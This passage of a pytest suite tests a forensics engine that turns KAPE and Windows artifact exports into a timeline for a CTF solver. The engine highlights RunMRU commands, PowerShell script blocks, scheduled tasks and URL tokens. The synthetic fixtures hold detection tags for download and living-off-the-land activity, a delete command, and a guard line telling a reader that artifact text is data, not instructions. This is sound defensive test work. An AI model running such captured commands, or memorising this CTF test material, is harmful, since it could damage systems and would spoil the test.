        (dt.datetime(2031, 3, 5, 12, 0, tzinfo=UTC), "url")]           # the numeric cell: Excel serial 47912.5
    assert hs[0].path == "https://portal.example.test/admin?token=frag_three&page=2"
    assert hs[0].description == "Admin Console" and hs[0].metadata["source_item"] == "History"
    assert hs[2].description == "sid" and hs[2].metadata["value"] == "plain-cookie"
    one = by_host(rep, "LAB-PC-01")
    stat = next(s for s in one.stats if s["kind"] == "hindsight")
    assert (stat["rows"], stat["kept"]) == (7, 4)
    assert any("1 Timeline row(s) have no readable timestamp" in n for n in one.notes)


def test_token_like_url_parameters_are_listed_once_with_their_first_time(case):
    rep = K.scan([case])
    toks = by_host(rep, "LAB-PC-01").tokens
    assert [(t["site"], t["path"], t["where"], t["param"], t["value"], t["seen"], t["time_utc"]) for t in toks] == [
        ("portal.example.test", "/admin", "query", "token", "frag_three", 2, "2031-03-05T08:00:00.250000Z"),
        ("sso.example.test", "/cb", "fragment", "access_token", "tok-abc", 1, "2031-03-05T12:00:00Z"),
        ("portal.example.test", "/untimed", "query", "token", "never", 1, None)]
    # page= and state= are not token-like; only the first sighting of a value is a highlight
    marked = [e for e in rep.events if e.metadata.get("highlight") == "browser-token"]
    assert [e.timestamp for e in marked] == [stamp("2031-03-05 08:00:00.250000"), dt.datetime(2031, 3, 5, 12, 0, tzinfo=UTC)]
    assert marked[0].metadata["tokens"] == ["token=frag_three"]
    assert K.url_tokens("https://x.example.test/p?page=2&lang=en") == []
    assert K.url_tokens("https://x.example.test/p?sid=9&code=7#id_token=z") == [
        ("query", "sid", "9"), ("query", "code", "7"), ("fragment", "id_token", "z")]


def test_inline_strings_and_skipped_cells_keep_their_columns():
    book = xlsx({"Timeline": [HS_HEADER, ["url", "2031-03-05 08:00:00.000", None, None, None, None, None, "History"]]},
                inline=True)
    with zipfile.ZipFile(io.BytesIO(book)) as zf:
        sheets = K.xlsx_sheets(zf)
        assert sheets == [("Timeline", "xl/worksheets/sheet1.xml")]
        rows = list(K.xlsx_rows(zf, sheets[0][1], K.xlsx_shared(zf)))
    assert rows[0] == dict(enumerate(HS_HEADER))
    assert rows[1] == {0: "url", 1: "2031-03-05 08:00:00.000", 7: "History"}        # H stays column 7


def test_rich_text_runs_are_joined_and_phonetic_runs_left_out():
    sst = ('<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><si><t>plain</t></si>'
           "<si><r><t>rich </t></r><r><t>text</t></r><rPh><t>NOT THIS</t></rPh></si></sst>")
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        z.writestr("xl/sharedStrings.xml", sst)
    with zipfile.ZipFile(io.BytesIO(b.getvalue())) as zf:
        assert K.xlsx_shared(zf) == ["plain", "rich text"]


@pytest.mark.parametrize("book, want", [
    (b"this is not a zip", "not an xlsx workbook"),
    (xlsx({"Sessions": [["Window"]]}), "no Timeline sheet (sheets: Sessions)"),
    (xlsx({"Timeline": [["only", "these"], ["cells", "here"]]}), "no header row with Type and Timestamp"),
    (xlsx({"Timeline": [HS_HEADER]}, prolog='<!DOCTYPE x [<!ENTITY a "b">]>'), "declares a DTD; refused"),
], ids=["not-a-zip", "no-timeline-sheet", "no-header", "dtd"])
def test_a_workbook_that_cannot_be_read_says_why(tmp_path, book, want):
    put(tmp_path, "h/WebBrowsers/Hindsight_output.xlsx", book)
    rep = K.scan([tmp_path])
    assert rep.events == [] and len(rep.collections) == 1
    notes = rep.collections[0].notes
    assert len(notes) == 1 and "Hindsight_output.xlsx" in notes[0] and want in notes[0]


def test_a_cell_naming_a_missing_shared_string_stops_the_read_with_a_note(tmp_path):
    good = xlsx({"Timeline": [HS_HEADER, ["url", "2031-03-05 08:00:00.000", "https://a.example.test/"]]})
    src = zipfile.ZipFile(io.BytesIO(good))
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        for name in src.namelist():
            data = src.read(name)
            if name == "xl/sharedStrings.xml":
                data = b'<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><si><t>Type</t></si></sst>'
            z.writestr(name, data)
    put(tmp_path, "h/WebBrowsers/Hindsight_output.xlsx", b.getvalue())
    rep = K.scan([tmp_path])
    assert rep.events == [] and "which the workbook does not have" in rep.collections[0].notes[0]


# ---------------------------------------------------------------- the plain exports

def test_ez_tool_exports_land_by_their_time_columns(tmp_path):
    base = tmp_path / "h"
    put(base, "FileFolderAccess/1_LECmd_Output.csv", _csv(
        ["SourceFile", "SourceCreated", "SourceModified", "LocalPath", "Arguments"],
        [["C:\\u\\Recent\\plan.lnk", "2031-03-01 08:00:00", "2031-03-02 09:00:00", "C:\\docs\\plan.docx", "/x"]]))
    put(base, "ProgramExecution/1_Windows10Creators_SYSTEM_AppCompatCache.csv", _csv(
        ["ControlSet", "Path", "LastModifiedTimeUTC", "Executed"], [["1", "C:\\Temp\\tool.exe", "2031-02-01 00:00:00", "Yes"]]))
    put(base, "ProgramExecution/1_Amcache_UnassociatedFileEntries.csv", _csv(
        ["FileKeyLastWriteTimestamp", "SHA1", "FullPath"], [["2031-03-03 03:03:03", "ab" * 20, "c:\\temp\\tool.exe"]]))
    put(base, "ProgramExecution/1_Amcache_DevicePnps.csv", _csv(["KeyName", "KeyLastWriteTimestamp"], [["x", "2031-03-03 03:03:03"]]))
    rep = K.scan([tmp_path])
    assert [(e.source, e.action, e.time_type, e.path, e.timestamp) for e in rep.events] == [
        ("appcompatcache", "shimcache entry (file last modified)", "m", "C:\\Temp\\tool.exe", stamp("2031-02-01 00:00:00")),
        ("lecmd", "shortcut created (target first opened)", "b", "C:\\docs\\plan.docx", stamp("2031-03-01 08:00:00")),
        ("lecmd", "shortcut modified (target last opened)", "m", "C:\\docs\\plan.docx", stamp("2031-03-02 09:00:00")),
        ("amcache", "amcache file entry (key last write)", "event", "c:\\temp\\tool.exe", stamp("2031-03-03 03:03:03"))]
    assert rep.events[0].description == "Executed=Yes" and "Arguments=/x" in rep.events[1].description
    # the device table is not a file-entries export: no reader claims it
    assert [r.rsplit("/", 1)[-1] for r, _s in rep.collections[0].others] == ["1_Amcache_DevicePnps.csv"]


# ---------------------------------------------------------------- one timeline

def test_one_timeline_sorted_in_utc_across_hosts_and_sources(case):
    rep = K.scan([case])
    stamps = [e.timestamp for e in rep.events]
    assert stamps == sorted(stamps) and all(s.tzinfo is not None and s.utcoffset() == dt.timedelta(0) for s in stamps)
    assert {e.metadata["host"] for e in rep.events} == {"LAB-PC-01", "LAB-PC-02"}
    assert {e.source.split(":")[0] for e in rep.events} == {"evtx", "recmd", "hindsight", "pecmd"}
    assert all(isinstance(e, TL.TimelineEvent) for e in rep.events)
    # the two hosts interleave: host 2's RunMRU write (09:59) precedes host 1's (10:00:05)
    mru = [e.metadata["host"] for e in rep.events if e.source == "recmd:RunMRU"]
    assert mru == ["LAB-PC-02", "LAB-PC-01"]
    assert len(rep.events) == 17          # host 1: 2 registry, 7 event log, 4 browser, 2 prefetch; host 2: 2


def test_the_highlights_are_the_chain_in_time_order(case):
    rep = K.scan([case])
    got = [(e.metadata["host"], e.metadata["highlight"], e.timestamp.strftime("%d %H:%M:%S")) for e in rep.highlights()]
    assert got == [
        ("LAB-PC-02", "runmru", "04 09:59:00"),
        ("LAB-PC-01", "runmru", "04 10:00:05"),
        ("LAB-PC-01", "scriptblock", "04 10:00:07"),        # after the RunMRU write, with a secret-like switch
        ("LAB-PC-02", "scriptblock", "04 10:00:08"),        # 68 s after host 2's RunMRU write: in its window
        ("LAB-PC-01", "task", "04 10:00:09"),               # \Updater Check registered
        ("LAB-PC-01", "task", "04 10:00:09"),               # \Backup Sync registered
        ("LAB-PC-01", "browser-token", "05 08:00:00"),
        ("LAB-PC-01", "browser-token", "05 12:00:00")]
    # with a 30 s window host 2's block is no longer one; host 1's (2 s after the write) still is
    short = K.scan([case], pivot_seconds=30)
    assert [e.metadata["host"] for e in short.highlights() if e.metadata["highlight"] == "scriptblock"] == ["LAB-PC-01"]


def test_outputs_are_written_and_timeline_py_reads_the_json_back(case, tmp_path):
    rep = K.scan([case])
    out = tmp_path / "out"
    wrote = K.write_outputs(rep, out)
    assert wrote["script_blocks"] == 3
    back = TL.ingest_path(out / "timeline.json")                     # the shape timeline.py itself emits
    assert [e.timestamp for e in back] == [e.timestamp for e in rep.events]
    assert sorted((e.source, e.action, e.path) for e in back) == sorted((e.source, e.action, e.path) for e in rep.events)
    rows = list(csv.DictReader(io.StringIO((out / "timeline.csv").read_text(encoding="utf-8"))))
    assert len(rows) == len(rep.events)
    first = rows[0]
    assert first["timestamp_utc"] == "2031-03-01T08:00:00Z" and first["host"] == "LAB-PC-01" and first["source"] == "recmd:x"
    doc = json.loads((out / "report.json").read_text(encoding="utf-8"))
    assert doc["engine"] == "toolkits.kape_timeline" and doc["events"] == 17
    assert doc["span_utc"] == ["2031-03-01T08:00:00Z", "2031-03-05T12:00:00Z"]
    one = next(c for c in doc["collections"] if c["host"] == "LAB-PC-01")
    blk = next(b for b in one["script_blocks"] if b["id"] == "blk-1")
    assert (out / blk["text_file"]).read_text(encoding="utf-8") == BLOCK_TEXT
    assert [t["name"] for t in one["scheduled_tasks"]][-1] == "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag"
    assert len(doc["highlights"]) == 8 and one["browser_tokens"][0]["value"] == "frag_three"


def test_a_long_script_block_is_cut_in_the_report_but_whole_in_its_file(tmp_path):
    text = "A" * 70000 + "END"
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [block(1, "2031-03-04 10:00:00.0000000", "big", 1, 1, text)]))
    rep = K.scan([tmp_path])
    K.write_outputs(rep, tmp_path / "out")
    doc = json.loads((tmp_path / "out/report.json").read_text(encoding="utf-8"))
    b = doc["collections"][0]["script_blocks"][0]
    assert b["chars"] == 70003 and len(b["text"]) == 65536 and b["text_cut"] is True
    assert (tmp_path / "out" / b["text_file"]).read_text(encoding="utf-8") == text
    assert len(K.render(rep)) < 20000                              # the printed report stays small


# ---------------------------------------------------------------- filters and limits

def test_the_window_filter_is_inclusive_and_in_utc(case):
    rep = K.scan([case], start="2031-03-04T10:00:07.100000Z", end="2031-03-04T10:00:09+00:00")
    assert [e.timestamp for e in rep.events] == [stamp("2031-03-04 10:00:07.100000"), stamp("2031-03-04 10:00:08"),
                                                 stamp("2031-03-04 10:00:08"), stamp("2031-03-04 10:00:09")]
    with pytest.raises(K.KapeError, match="--start/--end"):
        K.scan([case], start="yesterday")
    with pytest.raises(K.KapeError, match="--start/--end"):
        K.scan([case], start="2031-03-05T00:00Z", end="2031-03-04T00:00Z")


def test_an_ioc_search_keeps_only_its_rows_and_counts_them_per_host(case):
    rep = K.scan([case], iocs=["UPDATES.example.test"])               # case-insensitive
    assert rep.iocs == ("updates.example.test",)
    assert by_host(rep, "LAB-PC-01").ioc_counts == {"updates.example.test": 4}
    assert by_host(rep, "LAB-PC-02").ioc_counts == {}
    # RunMRU value row, the 4688 row, the schtasks row, and the MFTECmd file no reader takes (untimed)
    assert sorted({(h["file"].rsplit("/", 1)[-1], h["row"]) for h in by_host(rep, "LAB-PC-01").ioc_hits}) == [
        ("20310306090100_EvtxECmd_Output.csv", 3), ("20310306090200_MFTECmd_$MFT_Output.csv", 3),
        ("20310306090500_RECmd_Batch_UserActivity_Output.csv", 1), ("Scheduled Tasks.csv", 1)]
    # the task whose schtasks row carries the string is on the timeline through its registration event
    assert [(e.source, e.metadata["ioc"]) for e in rep.events] == [
        ("recmd:RunMRU", ["updates.example.test"]), ("evtx:Security", ["updates.example.test"]),
        (f"evtx:{TS}", ["updates.example.test"])]
    text = K.render(rep)
    assert "'updates.example.test': LAB-PC-01=4, LAB-PC-02=0" in text


def test_an_ioc_pulls_in_a_row_the_default_selection_drops(case):
    rep = K.scan([case], iocs=["logontype"])
    assert [(e.metadata["event_id"], e.metadata["ioc"]) for e in rep.events] == [(4624, ["logontype"])]
    assert events_of(K.scan([case]), event_id=4624) == []


def test_an_ioc_inside_a_joined_script_block_is_found_across_parts(tmp_path):
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        block(1, "2031-03-04 10:00:00.0000000", "s", 1, 2, "contact evil-pa"),
        block(2, "2031-03-04 10:00:00.1000000", "s", 2, 2, "rt.example.test now")]))
    rep = K.scan([tmp_path], iocs=["evil-part.example.test"])
    assert [e.metadata["script_block_id"] for e in rep.events] == ["s"]
    assert rep.collections[0].script_blocks[0]["ioc"] == ["evil-part.example.test"]


def test_the_event_cap_is_named_with_the_number_left_out(case):
    rep = K.scan([case], max_events=5)
    assert len(rep.events) == 5
    assert any("capped at 5 events; 12 more were left out" in n for n in rep.notes)
    with pytest.raises(K.KapeError, match="max_events"):
        K.scan([case], max_events=0)
    with pytest.raises(K.KapeError, match="pivot_seconds"):
        K.scan([case], pivot_seconds=-1)


def test_the_row_cap_is_named_and_the_rows_before_it_are_kept(tmp_path):
    put(tmp_path, "h/ProgramExecution/x_PECmd_Output_Timeline.csv", _csv(
        ["RunTime", "ExecutableName"], [[f"2031-03-04 10:00:0{i}.0000000", f"P{i}.EXE"] for i in range(6)]))
    rep = K.scan([tmp_path], max_rows=4)
    assert [e.path for e in rep.events] == ["P0.EXE", "P1.EXE", "P2.EXE", "P3.EXE"]
    assert any("stopped after 4 rows (row limit)" in n for n in rep.collections[0].notes)


def test_a_file_over_the_size_limit_is_not_read_and_says_so(tmp_path, monkeypatch):
    put(tmp_path, "h/ProgramExecution/x_PECmd_Output_Timeline.csv", _csv(
        ["RunTime", "ExecutableName"], [["2031-03-04 10:00:00.0000000", "P.EXE"]]))
    monkeypatch.setattr(K, "MAX_FILE_BYTES", 20)
    rep = K.scan([tmp_path])
    assert rep.events == [] and "is over the limit of 20" in rep.collections[0].notes[0]


def test_the_csv_field_limit_is_restored_after_a_scan(case):
    before = csv.field_size_limit(54321)          # a value no other code sets
    try:
        K.scan([case])
        assert csv.field_size_limit() == 54321
        with pytest.raises(K.KapeError):
            K.scan([case / "nope"])
        assert csv.field_size_limit() == 54321
    finally:
        csv.field_size_limit(before)


# ---------------------------------------------------------------- zips

def _zip_tree(folder: Path) -> bytes:
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        for f in sorted(folder.rglob("*")):
            if f.is_file():
                z.writestr(zipfile.ZipInfo(f.relative_to(folder.parent).as_posix(), date_time=(2031, 1, 1, 0, 0, 0)),
                           f.read_bytes())
    return b.getvalue()


def test_a_zip_is_read_in_place(tmp_path):
    base = host1(tmp_path / "src")
    put(tmp_path, "handout/LAB-PC-01.zip", _zip_tree(base))
    direct = K.scan([tmp_path / "handout" / "LAB-PC-01.zip"])
    folder = K.scan([tmp_path / "handout"])
    plain = K.scan([tmp_path / "src"])
    for rep in (direct, folder):
        assert [(c.host, c.layout, c.root) for c in rep.collections] == [("LAB-PC-01", "kape", "Kape-parsed-LAB-PC-01")]
        assert [(e.timestamp, e.source, e.action, e.path) for e in rep.events] == [
            (e.timestamp, e.source, e.action, e.path) for e in plain.events]
    assert list((tmp_path / "handout").iterdir()) == [tmp_path / "handout" / "LAB-PC-01.zip"]       # nothing extracted


def test_a_zip_already_unpacked_beside_it_is_not_read_twice(tmp_path):
    base = host1(tmp_path / "scratch" / "LAB-PC-01.zip.unpacked")
    put(tmp_path, "scratch/LAB-PC-01.zip", _zip_tree(base))
    rep = K.scan([tmp_path / "scratch"])
    assert len(rep.collections) == 1 and len(rep.events) == len(K.scan([base.parent]).events)
    assert any("LAB-PC-01.zip" in n and "already unpacked in the folder" in n and "not read again" in n
               for n in rep.notes)


def test_a_zip_whose_unpacked_copy_was_renamed_is_still_not_read_twice(tmp_path):
    """An unpacker may make member names safe (the space in `Scheduled Tasks.csv`): the copy is
    still recognised, by its size and its name without the replaced characters."""
    base = host1(tmp_path / "scratch" / "LAB-PC-01.zip.unpacked")
    put(tmp_path, "scratch/LAB-PC-01.zip", _zip_tree(base))
    (base / "Persistence" / "Scheduled Tasks.csv").rename(base / "Persistence" / "Scheduled_Tasks.csv")
    rep = K.scan([tmp_path / "scratch"])
    assert len(rep.collections) == 1 and len(rep.events) == 15
    assert rep.collections[0].tree.where.endswith("scratch")              # read from the folder
    assert any("the zip was not read again" in n for n in rep.notes)


def test_a_partly_unpacked_zip_is_read_whole_in_place_and_nothing_twice(tmp_path):
    """A sweep leaves members over its size limit in the zip. The zip is then the complete copy: it
    is read in place, and the unpacked copies of its files are left out."""
    plain = K.scan([host1(tmp_path / "plain").parent])
    base = host1(tmp_path / "scratch" / "LAB-PC-01.zip.unpacked")
    put(tmp_path, "scratch/LAB-PC-01.zip", _zip_tree(base))
    (base / "EventLogs" / "20310306090100_EvtxECmd_Output.csv").unlink()      # the member the sweep skipped
    host2(tmp_path / "scratch")                                               # another host, only as a folder
    rep = K.scan([tmp_path / "scratch"])
    assert [(c.host, c.tree.where.rsplit("/", 1)[-1]) for c in rep.collections] == [
        ("LAB-PC-02", "scratch"), ("LAB-PC-01", "LAB-PC-01.zip")]
    one = [(e.timestamp, e.source, e.action, e.path) for e in rep.events if e.metadata["host"] == "LAB-PC-01"]
    assert one == [(e.timestamp, e.source, e.action, e.path) for e in plain.events] and len(one) == 15
    assert len(rep.events) == 17 and len(by_host(rep, "LAB-PC-01").script_blocks) == 2
    assert any("LAB-PC-01.zip: read in place, because only 4 of its 5 artifact file(s) are unpacked" in n
               and "left out" in n for n in rep.notes)


def test_a_file_that_is_no_zip_and_a_missing_path_are_named(tmp_path):
    put(tmp_path, "note.txt", b"hello")
    with pytest.raises(K.KapeError, match="not a folder and not a zip"):
        K.scan([tmp_path / "note.txt"])
    with pytest.raises(K.KapeError, match="no such file or folder"):
        K.scan([tmp_path / "absent"])


# ---------------------------------------------------------------- the answer

def _ff():
    from ctf import flagfmt
    return flagfmt.for_profile(CSCTF)


def test_fragments_are_evidence_and_never_joined_into_a_flag(case):
    rep = K.scan([case])
    res = K.result_of(rep, _ff(), K.render(rep))
    assert res.status == "unsure" and res.flags == () and res.engine == "toolkits.kape_timeline"
    blob = res.to_json()
    for joined in ("frag_one_frag_two_frag_three", "frag_onefrag_twofrag_three", "CSCTF{"):
        assert joined not in blob
    kinds = [e.detail.split(" ")[2].rstrip(":") for e in res.evidence]
    assert kinds == ["runmru", "runmru", "scriptblock", "scriptblock", "task", "task", "browser-token",
                     "browser-token"]
    assert "nothing is joined into a flag" in res.notes and "17 timeline event(s) from 2 collection(s)" in res.notes
    assert SolverResult.from_json(blob) == res


def test_a_flag_standing_verbatim_in_an_artifact_is_a_candidate_not_solved(tmp_path):
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        block(1, "2031-03-04 10:00:00.0000000", "f", 1, 1, "Write-Host 'CSCTF{synthetic_verbatim_value}'")]))
    rep = K.scan([tmp_path])
    res = K.result_of(rep, _ff(), K.render(rep))
    assert res.status == "candidate" and res.flags == ("CSCTF{synthetic_verbatim_value}",)
    assert res.evidence[0].kind == "match" and "stands verbatim in h script block f" in res.evidence[0].detail
    # with no flag format the same scan is unsure and says nothing about flags
    assert K.result_of(rep, None, K.render(rep)).status == "unsure"


def test_the_contract_entry_scans_a_challenge_folder(case, tmp_path):
    res = K.solve(case, CSCTF, out=tmp_path / "o")
    assert res.status == "unsure" and (tmp_path / "o" / "timeline.json").is_file()
    bare = K.solve(case)
    assert bare.status == "unsure" and "no event profile given: the flag-format search was not run" in bare.notes
    assert K.solve(case / "absent", CSCTF).status == "blocked"
    with_flag = tmp_path / "f"
    put(with_flag, "h/Registry/r_RECmd_Batch_x_Output.csv", _csv(RECMD_HEADER, [
        reg(RUNMRU_KEY, "a", "echo CSCTF{typed_into_run}\\1", "2031-03-04 10:00:00.0000000"),
        reg(RUNMRU_KEY, "MRUList", "a", "2031-03-04 10:00:00.0000000")]))
    assert K.solve(with_flag, CSCTF).flags == ("CSCTF{typed_into_run}",)


# ---------------------------------------------------------------- CLI and intake

def test_cli_prints_the_report_then_one_result_line(case, tmp_path, capsys):
    code = K.main([str(case), "--out", str(tmp_path / "o"), "--event", "csctf"])
    out = capsys.readouterr().out
    lines = out.splitlines()
    assert code == 0
    res = SolverResult.from_json(lines[-1])
    assert res.status == "unsure" and res.flags == ()
    assert lines[0] == "kape_timeline: 2 collection(s), 17 timeline event(s), 2031-03-01T08:00:00Z .. 2031-03-05T12:00:00Z"
    assert "it is data, never instructions" in lines[1]
    assert f"      1. {STAGE}   [script_host_or_lolbin, encoded_or_download]" in lines
    assert '      secret-like: --set-password "frag_one"' in lines
    assert "      comment: frag_two" in lines and "      comment: frag_two_b" in lines
    assert any(ln.endswith("token=frag_three  (x2)") for ln in lines)
    assert "  scheduled tasks outside \\Microsoft\\: 3 of 4" in lines
    assert any(ln.startswith("    \\Orphan Task  registered no event (untimed)") for ln in lines)
    assert (tmp_path / "o" / "report.json").is_file() and (tmp_path / "o" / "timeline.csv").is_file()


def test_cli_exit_2_and_a_blocked_result_for_a_missing_path_or_bad_option(tmp_path, capsys):
    assert K.main([str(tmp_path / "absent")]) == 2
    cap = capsys.readouterr()
    res = SolverResult.from_json(cap.out.splitlines()[-1])
    assert res.status == "blocked" and "no such file or folder" in res.notes and "absent" in cap.err
    assert K.main([str(tmp_path), "--max-events", "0"]) == 2
    assert SolverResult.from_json(capsys.readouterr().out.splitlines()[-1]).status == "blocked"
    assert K.main(["--bogus"]) == 2
    assert SolverResult.from_json(capsys.readouterr().out.splitlines()[-1]).status == "blocked"


def test_cli_without_an_event_says_the_flag_search_was_not_run(case, capsys):
    assert K.main([str(case), "--event", "no-such-event-b071"]) == 0
    res = SolverResult.from_json(capsys.readouterr().out.splitlines()[-1])
    assert res.status == "unsure" and "the flag-format search was not run" in res.notes


def test_cli_output_stays_under_the_intake_cut_with_huge_artifacts(tmp_path, capsys):
    rows = [block(i, f"2031-03-04 10:{i // 60:02d}:{i % 60:02d}.0000000", f"b{i}", 1, 1, "Z" * 40000) for i in range(120)]
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, rows))
    assert K.main([str(tmp_path), "--event", "csctf"]) == 0
    out = capsys.readouterr().out
    assert len(out.encode()) < (1 << 20) // 4                         # intake cuts stdout at 1 MiB
    assert "... 95 more (report.json with --out)" in out
    assert sum(1 for ln in out.splitlines() if ln.startswith("      text: ")) == 25      # 25 listed, not 120
    assert SolverResult.from_json(out.splitlines()[-1]).status == "unsure"


class _Adapter:
    kind = "fake"

    def __init__(self, challenge, files):
        self.challenge, self.files = challenge, files

    def list_challenges(self):
        return [self.challenge]

    def get_challenge(self, cid):
        return self.challenge

    def download_files(self, cid, dest):
        out = []
        for rel, data in self.files.items():
            out.append(put(Path(dest), rel, data))
        return out

    def submit(self, cid, flag):
        raise AssertionError("intake must never submit")

    def team_solves(self):
        return []


def test_intake_runs_the_engine_on_a_kape_zip_with_no_model(tmp_path):
    """The manifest's [intake] table: a handout zip with EvtxECmd output is unpacked by the sweep and
    the engine runs on the folder, under the network guard, and leaves its timeline in recon/."""
    base = host1(tmp_path / "src")
    ch = Challenge(id="71", name="Triage", category="forensics", points=100, description="three laptops",
                   files=(FileRef("LAB-PC-01.zip"),), solved_by_team=False)
    rep = I.intake_one("71", CSCTF, adapter=_Adapter(ch, {"LAB-PC-01.zip": _zip_tree(base)}),
                       workdir=tmp_path / "wd", options=I.Options(net_guard="hook"))
    runs = [r for r in rep.runs if r.engine == "toolkits.kape_timeline"]
    assert len(runs) == 1 and runs[0].status == "ok" and runs[0].result_status == "unsure" and runs[0].flags == ()
    out = (rep.dir / runs[0].output).read_text(encoding="utf-8")
    assert f"      1. {STAGE}" in out and "comment: frag_two" in out and "token=frag_three" in out
    assert "the zip was not read again" in out                    # the sweep's unpacked copy was read, once
    made = rep.dir / "recon" / "engines" / "toolkits.kape_timeline"
    assert len(json.loads((made / "timeline.json").read_text(encoding="utf-8"))) == 15
    assert rep.result.status != "solved"


def test_the_manifest_matchers_take_kape_names_and_leave_other_csvs(tmp_path):
    from ctf.engines import manifest as M
    from ctf.intake import engines as E
    spec = M.load(Path(K.__file__).with_name("kape_timeline.manifest.toml"))
    assert spec.id == K.ENGINE and not spec.has("legacy-output")       # its last line is a SolverResult
    assert spec.intake.run == "folder" and spec.intake.select == "files" and spec.cost_class == "cheap"
    assert "{folder}" in spec.intake.args and "{out}" in spec.intake.args
    heads = [(tmp_path / n, b"") for n in ("20310306_EvtxECmd_Output.csv", "1_RECmd_Batch_UserActivity_Output.csv",
                                           "Hindsight_output.xlsx", "report.csv", "book.xlsx")]
    assert [f.name for f, _why in E.files_matching(spec.intake.match, heads)] == [
        "20310306_EvtxECmd_Output.csv", "1_RECmd_Batch_UserActivity_Output.csv", "Hindsight_output.xlsx"]


# ---------------------------------------------------------------- edges of the rules above

def _mru(when="2031-03-04 10:00:05.0000000", command="calc"):
    return _csv(RECMD_HEADER, [reg(RUNMRU_KEY, "a", command + "\\1", when), reg(RUNMRU_KEY, "MRUList", "a", when)])


def test_the_pivot_window_starts_at_the_runmru_write_and_is_inclusive(tmp_path):
    put(tmp_path, "h/Registry/r_RECmd_Batch_x_Output.csv", _mru())
    times = ["10:00:04.9999999", "10:00:05.0000000", "10:05:05.0000000", "10:05:05.0000010"]
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(i, f"2031-03-04 {t}", 4688, "Security", {"NewProcessName": f"p{i}.exe", "CommandLine": "x"})
        for i, t in enumerate(times, 1)]
        + [ev(9, "2031-03-04 10:00:06.0000000", 1, "Microsoft-Windows-Sysmon/Operational", {"Image": "s.exe", "CommandLine": "y"}),
           ev(10, "2031-03-04 10:00:06.0000000", 4103, PS, {"ContextInfo": "c", "Payload": "p"}),
           ev(11, "2031-03-04 10:00:06.0000000", 4688, "Microsoft-Windows-Other/Security", {"NewProcessName": "no.exe", "CommandLine": "z"})]))
    rep = K.scan([tmp_path])
    kept = [(e.metadata["event_id"], e.path) for e in rep.events if e.source.startswith("evtx:")]
    # before the write and after write + 300 s: dropped; 4688 counts only in the Security log itself
    assert kept == [(4688, "p2.exe"), (4103, ""), (1, "s.exe"), (4688, "p3.exe")]      # ties: by source
    assert all(e.metadata["tags"] == ["pivot"] for e in rep.events if e.source.startswith("evtx:"))


@pytest.mark.parametrize("key, kept", [
    ("ROOT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", True),
    ("ROOT\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", True),
    ("ROOT\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", True),
    ("ROOT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths", True),
    ("ROOT\\Software\\Microsoft\\Internet Explorer\\TypedURLs", True),
    ("ROOT\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesExtra", False),
    ("ROOT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Sub", False),
    ("ROOT\\Software\\Vendor\\Explorer\\TypedPathsBackup", False),
], ids=["run", "runonce", "runonceex", "typedpaths", "typedurls", "runservicesextra", "run-subkey", "typedpathsbackup"])
def test_which_registry_keys_reach_the_timeline(tmp_path, key, kept):
    put(tmp_path, "h/Registry/r_RECmd_Batch_x_Output.csv", _csv(RECMD_HEADER, [
        reg(key, "url1", "value-one", "2031-03-04 10:00:00.0000000"),
        reg(key, "url2", "value-two", "2031-03-04 10:00:00.0000000")]))
    rep = K.scan([tmp_path])
    assert [(e.path, e.description) for e in rep.events] == ([(key, "url1=value-one; url2=value-two")] if kept else [])


def test_a_deleted_runmru_key_is_marked(tmp_path):
    put(tmp_path, "h/Registry/r_RECmd_Batch_x_Output.csv", _csv(RECMD_HEADER, [
        reg(RUNMRU_KEY, "a", "cmd /c del\\1", "2031-03-04 10:00:00.0000000", deleted="True"),
        reg(RUNMRU_KEY, "MRUList", "a", "2031-03-04 10:00:00.0000000")]))
    rep = K.scan([tmp_path])
    assert rep.collections[0].run_mru[0]["deleted"] is True and rep.events[0].metadata["deleted"] is True
    assert "[deleted key]" in K.render(rep)
    put(tmp_path / "live", "h/Registry/r_RECmd_Batch_x_Output.csv", _mru())
    live = K.scan([tmp_path / "live"])
    assert live.collections[0].run_mru[0]["deleted"] is False and "deleted" not in live.events[0].metadata
    assert "[deleted key]" not in K.render(live)


def test_a_short_row_is_padded_not_a_crash(tmp_path):
    body = _csv(["RunTime", "ExecutableName"], []) + b"2031-03-04 10:00:00.0000000\r\n2031-03-04 10:00:01.0000000,B.EXE\r\n"
    put(tmp_path, "h/ProgramExecution/x_PECmd_Output_Timeline.csv", body)
    rep = K.scan([tmp_path])
    assert [(e.timestamp.second, e.path) for e in rep.events] == [(0, ""), (1, "B.EXE")]


def test_a_batch_the_event_reader_returns_short_is_left_out_with_a_note(tmp_path, monkeypatch):
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(i, f"2031-03-04 10:00:0{i}.0000000", 7045, "System", {"ServiceName": f"s{i}", "ImagePath": "p"}) for i in (1, 2, 3)]))
    real = W.json_events
    monkeypatch.setattr(K.W, "json_events", lambda data, src="": (real(data, src)[0][:-1], False))
    rep = K.scan([tmp_path])
    assert rep.events == []
    assert "rows 1..3: windows.json_events read 2 of 3 events; the batch was left out" in rep.collections[0].notes[0]


def test_more_rows_than_one_batch_are_all_read(tmp_path):
    n = K.BATCH_ROWS * 2 + 7
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(i, f"2031-03-04 10:{i // 60:02d}:{i % 60:02d}.0000000", 7045, "System", {"ServiceName": f"s{i}", "ImagePath": "p"})
